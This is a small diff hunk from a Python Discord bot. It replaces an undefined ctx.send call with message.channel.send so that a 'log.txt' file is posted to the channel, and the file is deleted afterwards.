@@ -324,7 +324,7 @@ async def on_message(message):
     
 			# send file to Discord in message
 			with open("log.txt", "rb") as file:
-				await ctx.send("Latest log: ", file=discord.File(file, "log.txt"))
+				await message.channel.send("Latest log: ", file=discord.File(file, "log.txt"))
 
 			os.remove("log.txt")
 				
